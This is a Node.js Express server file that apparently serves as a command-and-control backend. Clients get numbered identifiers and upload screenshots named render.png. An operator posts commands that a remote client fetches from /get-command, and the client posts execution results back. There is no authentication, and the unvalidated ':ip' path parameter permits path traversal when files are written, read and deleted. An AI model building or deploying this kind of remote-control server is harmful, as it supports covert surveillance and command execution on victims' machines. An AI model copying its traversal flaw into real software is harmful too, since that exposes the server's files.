const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const uploadFolder = path.join(__dirname, 'uploads');
let command = ''; // Variable to store the command
let resultado = ''

// Middleware to serve static files
app.use(express.static('public'));
app.use(express.json()); // Middleware to parse JSON bodies

// Ensure upload directory exists
if (!fs.existsSync(uploadFolder)) {
  fs.mkdirSync(uploadFolder);
}

// Function to generate a unique "IP"
let ipCounter = 1;
const generateIP = () => `192.450.34.${ipCounter++}`;

// Route to get a new "IP"
app.get('/new-ip', (req, res) => {
  const newIP = generateIP();
  const ipFolder = path.join(uploadFolder, newIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder);
  }
  res.send({ ip: newIP });
});

// Multer storage configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const userIP = req.params.ip;
    const ipFolder = path.join(uploadFolder, userIP);
    if (!fs.existsSync(ipFolder)) {
      fs.mkdirSync(ipFolder);
    } else {
      // Remove the existing render.png file
      const existingFile = path.join(ipFolder, 'render.png');
      if (fs.existsSync(existingFile)) {
        fs.unlinkSync(existingFile);
      }
    }
    cb(null, ipFolder);
  },
  filename: (req, file, cb) => {
    cb(null, 'render.png');
  }
});

const upload = multer({ storage: storage });

// Route to upload file to specific "IP"
app.post('/upload/:ip', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).send('No file uploaded.');
  }
  res.send('File successfully uploaded.');
});

// Route to render images from a specific "IP"
app.get('/render-image/:ip', (req, res) => {
  const userIP = req.params.ip;
  const ipFolder = path.join(uploadFolder, userIP);
  const filePath = path.join(ipFolder, 'render.png');
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('Image not found.');
  }
});

// Configure EJS as view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Route to render HTML with image
app.get('/render-html/:ip', (req, res) => {
  const userIP = req.params.ip;
  res.render('render', { ip: userIP });
});

// Route to select IP and view images
app.get('/select-ip', (req, res) => {
  fs.readdir(uploadFolder, (err, folders) => {
    if (err) {
      return res.status(500).send('Error reading IP folders.');
    }
    res.render('select-ip', { ips: folders });
  });
});

// Route to view images of a selected IP
app.get('/view-images/:ip', (req, res) => {
  const userIP = req.params.ip;
  const ipFolder = path.join(uploadFolder, userIP);
  const filePath = path.join(ipFolder, 'render.png');
  if (fs.existsSync(filePath)) {
    res.render('view-images', { ip: userIP, images: ['render.png'] });
  } else {
    res.status(404).send('IP not found.');
  }
});

// Route to receive command from user
app.post('/send-command', (req, res) => {
  const { cmd } = req.body;
  if (!cmd) {
    return res.status(400).send('No command provided.');
  }
  command = cmd; // Store the command
  res.send('Command received.');
});

// Route to get the command for execution
app.get('/get-command', (req, res) => {
  const cmd = command;
  command = ''; 
  res.send(cmd);
});

// Route to receive the result of execution
app.post('/receive-result', (req, res) => {
  const { result } = req.body;
  resultado = result
  console.log('Result received:', result);
  // You can process the result here as needed
  res.send('Result received.');
});
app.get('/result-executed',(req, res)=>{

    res.send(resultado)
    resultado = ""

})

// Start the server
const port = 3000;
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});
